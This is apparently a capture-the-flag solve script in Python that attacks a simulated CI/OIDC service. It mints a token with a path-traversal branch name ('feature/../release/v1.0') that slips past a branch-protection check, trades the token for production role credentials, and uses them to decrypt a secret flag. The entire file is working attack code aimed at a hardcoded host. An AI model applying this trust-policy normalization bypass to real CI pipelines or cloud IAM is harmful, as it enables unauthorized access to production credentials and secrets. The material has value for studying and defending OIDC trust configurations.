#!/usr/bin/env python3
"""
CloudGate OIDC exploit: branch-protection bypass via path traversal that
normalizes into a release/* ref, satisfying the IAM trust policy's
StringLike condition without ever pushing to a protected branch.

Usage: python3 solve.py
"""
import http.client
import json
import urllib.parse

HOST = '91.99.207.116'
PORT = 16368


def get_ack_cookie():
    conn = http.client.HTTPConnection(HOST, PORT, timeout=15)
    conn.request('POST', '/api/acknowledge', body=b'', headers={'Content-Length': '0'})
    r = conn.getresponse()
    set_cookie = r.getheader('Set-Cookie')
    r.read()
    conn.close()
    # Set-Cookie: ctf_ack=human-participant; Expires=...; Max-Age=86400; Path=/; SameSite=Lax
    return set_cookie.split(';')[0]


def post(cookie, path, fields):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=15)
    headers = {'Cookie': cookie, 'Content-Type': 'application/x-www-form-urlencoded'}
    conn.request('POST', path, body=urllib.parse.urlencode(fields), headers=headers)
    r = conn.getresponse()
    data = json.loads(r.read())
    conn.close()
    return r.status, data


def main():
    cookie = get_ack_cookie()
    print('[*] ack cookie:', cookie)

    # Step 1: mint a token with a traversal branch name. The literal string
    # does not start with "release/" so the branch-protection filter passes
    # it, but after normalization the ref/sub claims collapse to release/v1.0.
    branch = 'feature/../release/v1.0'
    status, mint = post(cookie, '/api/v1/ci/mint-token', {'branch': branch})
    assert status == 200, mint
    print('[*] minted sub claim:', mint['claims']['sub'])

    # Step 2: exchange the token for temporary production credentials.
    status, assumed = post(cookie, '/api/v1/sts/assume-role', {
        'RoleArn': 'arn:aws:iam::123456789012:role/DevSecOps-Deployer-Prod',
        'WebIdentityToken': mint['token'],
    })
    assert status == 200, assumed
    creds = assumed['AssumeRoleWithWebIdentityResponse']['AssumeRoleWithWebIdentityResult']['Credentials']
    print('[*] AccessKeyId:', creds['AccessKeyId'])
    print('[*] SessionToken:', creds['SessionToken'])

    # Step 3: use the session token to decrypt the production secret.
    status, secret = post(cookie, '/api/v1/kms/decrypt-production-secret', {
        'SessionToken': creds['SessionToken'],
    })
    assert status == 200, secret
    print('[+] FLAG:', secret['PlaintextSecret'])


if __name__ == '__main__':
    main()
